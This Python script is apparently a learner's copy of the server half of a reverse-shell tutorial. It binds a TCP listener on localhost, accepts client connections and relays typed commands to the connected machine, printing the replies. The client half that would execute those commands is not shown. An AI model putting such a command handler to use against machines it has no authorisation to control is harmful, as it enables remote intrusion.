#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Tue Jan 28 11:35:06 2020

THis is from a youtube tutorial: Python Reverse Shell Tutorial - 1 through 3
from user: thenewboston

@author: winter
"""


import socket
import sys

# create socket (allows two computers to connect)
def socket_create():
    try:
        #global host
        #global port
        #global s
        #host = ''
        #port = 7071
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error as msg:
        print(f"socket creation error: {msg}")
    return server_socket

# bind the socket to port and wait for connection from client
def socket_bind(server_socket,host,port,listen_num = 5):
    try:
        server_address = (host, port)
        print(f'starting up on {server_address[0]} port {server_address[1]}')
        server_socket.bind(server_address)
        server_socket.listen(listen_num)
    except socket.error as msg:
        print(f"socket binding error: {msg}")
              
# establish a connection with the client
def socket_accept(server_socket):
    client_socket, client_address = server_socket.accept()
    print(f'connection from IP {client_address[0]} | port  {client_address[1]}')
    send_commands(server_socket,client_socket)
    client_socket.close()
    return client_socket, client_address
    
def send_commands(server_socket, client_socket):
    #sends commands to the client
    while True:
        # Get a command from the terminal
        cmd = input()
        if cmd.lower() == 'quit':
            client_socket.close()
            server_socket.close()
            sys.exit()
        if len(bytes(cmd,"utf-8")) > 0: # get the length of the cmd after encoding it as bytes
            client_socket.send(bytes(cmd,"utf-8"))
            client_response = client_socket.recv(1024).decode("utf-8")
            print(client_response,end = '') # the end has to do with not wanting a newline character at the end which is the default


server_socket = socket_create()
socket_bind(server_socket,'localhost',7072)
#client_socket, client_address = socket_accept(server_socket)

while True:
    client_socket, client_address = server_socket.accept()
    print(f'connection from IP {client_address[0]} | port  {client_address[1]}')
    send_commands(server_socket,client_socket)
    


    
            
            
            
    

